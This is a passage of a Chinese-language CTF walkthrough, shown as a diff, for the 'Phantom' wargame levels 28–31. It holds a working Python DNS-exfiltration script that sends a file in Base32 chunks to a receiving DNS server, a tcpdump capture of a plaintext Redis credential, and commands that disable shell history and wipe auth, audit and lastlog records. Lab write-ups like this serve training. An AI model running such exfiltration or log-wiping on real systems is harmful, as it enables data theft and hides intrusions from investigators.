@@ -2161,32 +2161,214 @@ through the tunnel you already learned to build.
 You have sudo. tcpdump is available.
 ```
 
+写一个python脚本来执行题目要求，在这里感谢 `@m1sk_og` 提供的帮助
+
+```python
+import base64
+import subprocess
+
+TARGET_FILE_PATH = "/opt/vault/classified.db"  # 待外泄的目标文件路径
+CAMPAIGN_ID      = "randark"                  # 行动/会话标识符（便于接收端过滤）
+CHUNK_SIZE       = 30                         # 单次外泄的数据块大小（字节）
+DNS_SERVER_IP    = "10.13.37.30"              # 接收端权威 DNS 服务器地址
+BASE_DOMAIN      = "exfil.local"              # 外泄使用的基础域名
+
+def exfiltrate_via_dns():
+    # 1. 读取目标文件的二进制内容
+    with open(TARGET_FILE_PATH, "rb") as file_handle:
+        raw_data = file_handle.read()
+        
+    print(f"[+] 文件大小: {len(raw_data)} Bytes")
+    
+    # 2. 按固定步长切片遍历文件数据
+    for byte_offset in range(0, len(raw_data), CHUNK_SIZE):
+        chunk_data = raw_data[byte_offset : byte_offset + CHUNK_SIZE]
+        
+        # 3. Base32 编码处理
+        # DNS 标签最大长度 63 字符，且不支持 Base64 中的 '+', '/', '=' 字符
+        # Base32 仅使用 A-Z 和 2-7，适合 DNS。rstrip("=") 去除填充符减小长度
+        encoded_chunk = base64.b32encode(chunk_data).decode().rstrip("=").upper()
+        
+        # 4. 构造 FQDN（完全合格域名）
+        # 格式: <编码数据>.<分块序号>.<行动标识>.<基础域名>
+        # 示例: ON3W2ZLBOQ....A.0.randark.exfil.local
+        fqdn = f"{encoded_chunk}.{byte_offset // CHUNK_SIZE}.{CAMPAIGN_ID}.{BASE_DOMAIN}"
+        
+        # 5. 发起 DNS 查询，数据随子域名发送至接收端
+        # 使用 dig 直接查询指定 DNS 服务器，避免本地缓存干扰
+        subprocess.run(
+            ["dig", f"@{DNS_SERVER_IP}", fqdn, "A"],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
+        )
+
+if __name__ == "__main__":
+    exfiltrate_via_dns()
+```
+
+即可获得flag
+
+```shell
+ops@mgmt-srv:~$ cat /tmp/heist.randark.flag 
+bl_phtm28_**hidden**
+```
+
 ## 29 Wire Tap
 
 ```plaintext
+ [ Phantom · Level 29 ]  Wire Tap
+ Full brief:  cat ~/BRIEFING
+ ─────────────────────────────────────────────
+ If you're stuck — read up on the topic, then come back:
+   https://www.tcpdump.org/manpages/tcpdump.1.html
+   https://redis.io/docs/reference/protocol-spec/
 ```
 
 查看说明
 
 ```plaintext title="BRIEFING"
+MISSION: Wire Tap
+================
+
+A service on this network sends credentials in plaintext.
+Every 30 seconds, a process connects to 10.13.37.10:6379 and sends auth data.
+
+Intercept the traffic. Extract the credential.
+Tools: tcpdump is available. You have root.
+```
+
+这个简单，直接抓包就好
+
+```shell
+phantom29@phantom:~$ sudo tcpdump -i any -A host 10.13.37.10 and port 6379
+tcpdump: data link type LINUX_SLL2
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes
+```
+
+稍等片刻就能捕获到
+
+```shell
+00:33:34.884183 eth1  Out IP phantom.48424 > phantom-web.breachlab-phantom_phantom-net.redis: Flags [P.], seq 1:47, ack 1, win 502, options [nop,nop,TS val 2585094562 ecr 4099353124], length 46: RESP "AUTH bl_phtm29_**hidden**" "PING" "QUIT"
 ```
 
 ## 30 Clean Exit
 
 ```plaintext
+━━━ phantom-deep · ephemeral session ━━━
+  L30 — Clean Exit
+  This container is yours alone. Destroyed on disconnect.
+  Mission brief: cat ~/BRIEFING
+  Verifier: /opt/verify-*.sh
 ```
 
 查看说明
 
 ```plaintext title="BRIEFING"
+MISSION: Clean Exit
+==================
+
+Multiple operator sessions ran on this box during Acts III-V.
+Every one of them left traces. Erase them all.
+
+An investigator will check every operator-trail category for
+every operator who logged in. You have the access you need —
+find it and use it.
+
+Run /opt/verify-clean-exit.sh when you believe every category
+is clean.
 ```
 
-##
+先尝试check一下
+
+```shell
+phantom30@4cf0f5625e5f:~$ /opt/verify-clean-exit.sh
+[*] Multi-session forensic sweep
+[*] Checking traces for: phantom16 phantom17 phantom18 phantom19 phantom20 phantom21 phantom22 phantom23 phantom24 phantom25 phantom26 phantom27 phantom28 phantom29 phantom30
+
+[!] auth.log: 4 user(s) still present
+[+] wtmp: CLEAN
+[+] btmp: CLEAN
+[!] bash_history: 4 user(s) still have a history file
+[!] audit.log: phantom-session traces remain
+[!] lastlog: 1 user(s) with recorded login
+[+] /tmp: isolated per-user by kernel namespace (no scan needed)
+
+[*] Traces found: 4
+[!] Clean everything and re-run this script.
+
+[!] 4 multi-session trace(s) remain
+```
+
+根据题目说明清理一下
+
+```shell
+set +o history
+
+find /home -name ".bash_history" -delete
+truncate -s 0 /var/log/lastlog
+truncate -s 0 /var/log/auth.log
+truncate -s 0 /var/log/audit/audit.log
+```
+
+即可通过校验
+
+```shell
+phantom30@fa04ff7346d8:~$ /opt/verify-clean-exit.sh
+[*] Multi-session forensic sweep
+[*] Checking traces for: phantom16 phantom17 phantom18 phantom19 phantom20 phantom21 phantom22 phantom23 phantom24 phantom25 phantom26 phantom27 phantom28 phantom29 phantom30
+
+[+] auth.log: CLEAN
+[+] wtmp: CLEAN
+[+] btmp: CLEAN
+[+] bash_history: CLEAN across all sessions
+[+] audit.log: CLEAN
+[+] lastlog: CLEAN
+[+] /tmp: isolated per-user by kernel namespace (no scan needed)
+
+[*] Traces found: 0
+
+[*] FLAG: bl_phtm30_b880669e733288a3
+[*] Use this as the password for phantom31.
+```
+
+## Phantom Graduation
 
 ```plaintext
+ [ Phantom · Level 31 · CLASSIFIED ]  Graduation
+ Full brief:  cat ~/BRIEFING
+ ─────────────────────────────────────────────
+ No new primitives. Reuse what 0-30 taught you.
+ Submit:  /opt/verify-graduation.sh <sha256>
 ```
 
 查看说明
 
 ```plaintext title="BRIEFING"
+MISSION: Phantom Operative — GRADUATION
+========================================
+
+This is the final test. No instructions. No new primitives.
+Everything you need you already practised in the preceding 31 levels.
+
+Objective: exfiltrate /root/objective.dat from the management server
+and submit its sha256sum to /opt/verify-graduation.sh.
+
+You decide how. The chain is the whole point.
+
+Time budget: 90 minutes (informal — no hard timer).
+Good luck, Operative.
 ```
+
+这个简单，在 `ops@10.13.37.30` 机器上存在有
+
+```shell
+ops@mgmt-srv:~$ sudo -l
+Matching Defaults entries for ops on mgmt-srv:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User ops may run the following commands on mgmt-srv:
+    (ALL) NOPASSWD: /usr/bin/cat /root/final_flag, /usr/bin/cat /root/objective.dat
+```
+
+直接读取，然后管道符传递给哈希计算即可
